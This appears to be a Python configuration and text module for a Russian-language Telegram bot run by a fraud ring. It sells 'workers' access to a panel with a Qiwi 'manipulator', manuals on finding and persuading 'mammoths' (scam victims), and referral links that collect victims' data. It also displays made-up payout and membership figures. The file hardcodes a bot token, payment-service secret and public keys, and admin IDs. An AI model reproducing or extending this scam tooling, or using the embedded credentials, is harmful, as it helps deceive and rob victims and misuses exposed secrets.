import telebot

main_token = '5471363068:AAHATZ_5IOX7uYUgKLuI01upQCG1J-3wEfE'
BOT_NAME = "RPayment🛑"

P2P_COMMENT = "Оплата доступа к панели"
WORKER_ACCESS = 100

SECRET_P2P = "eyJ2ZXJzaW9uIjoiUDJQIiwiZGF0YSI6eyJwYXlpbl9tZXJjaGFudF9zaXRlX3VpZCI6IjZxYTJjNy0wMCIsInVzZXJfaWQiOiI3OTUwNjc3NDE5NyIsInNlY3JldCI6ImQxYmMxMDdmNjc1YmZjZWU3M2MxZThiNzAxOGZiYjgzZmYzNzUwNDQ5ZGU5YzQzNTdiNWQxMjliNWZmM2ExNmMifX0="
PUBLIC_P2P = "48e7qUxn9T7RyYE1MVZswX1FRSbE6iyCj2gCRwwF3Dnh5XrasNTx3BGPiMsyXQFNKQhvukniQG8RTVhYm3iP5PzbeqePjzuhV7JUmMDiTjKeYggK2C9czQRH3AMo7nUSZTt7qbibZ8PMaYgKWwqxyVQPkhHEkgc8zSpvmFferJkw5YriMLh5DHvBn59hM"

admins = [1111617356 ]

bot = telebot.TeleBot(main_token, threaded=True, num_threads=300)

manual_1 = "https://telegra.ph/Kak-snyat-dengi-04-02"
manual_2 = "https://telegra.ph/Gde-najti-mamonta-04-02"
manual_3 = "https://telegra.ph/BEZOPASNOST-NASHE-VSE-04-02"
manual_4 = "https://telegra.ph/Kak-ubedit-mamonta-04-02"

phone_regex = "^[7|8|380](\d{10,11})$"

def worker_p2p_text():
	text = \
	"<b>После оплаты вы получаете\n"\
	"+ Личный киви манипулятор 🥝\n"\
	"+ Чат воркеров 💬\n"\
	"+ Уникальную сыллку для приглашений мамонтов 🦣\n" \
	"+ Мануалы по поиску и безопасности 📚\n"\
	"+ Дружный коллектив и хорошую атмосферу🎉\n"\
	"+ Как убедить мамонта в работе бота🤖\n\n"\
	"Оплатить доступ BTC ЧЕКОМ  https://t.me/ВАШ_НИК</b>"
	return text

def statistics_text():
	text = \
	"<b>ВЫПЛАЧЕНО БОЛЕЕ 270000₽ 🤑\n\n"\
	"Участников в боте: 29000👥</b>\n"

	return text

def profile_text(user_id):
	text = \
	f"<b>👤 Профиль: {user_id}\n\n"\
	"💰 Баланс: 0 руб.\n"\
	"❌ Вы не зарегистрированы\n"\
	"📆 Заработно за все время: 0 руб.\n\n"\
	"💳 Вывод средств будет доступен как только баланс станет выше 1 руб.</b>"

	return text

def worker_manuals_text():
	text = \
	f"Как снять деньги с киви 🥝 <a href='{manual_1}'>ТЫК</a>\n\n"\
	f"Как найти мамонта 🦣 <a href='{manual_2}'>ТЫК</a>\n\n"\
	f"Безопасность наше все 🔥 <a href='{manual_3}'>ТЫК</a>\n\n"\
	f"Как убедить мамонта 🎆 <a href='{manual_4}'>ТЫК</a>\n\n"

	return text

def worker_add_mamont_text(worker_id):
	text = \
	"<b>Для получения данных мамонта необходимо чтобы он зарегестрировался в боте по вашей ссылке ⬇️\n"\
	f"<code>https://t.me/{BOT_NAME}?start={worker_id}</code></b>"

	return text
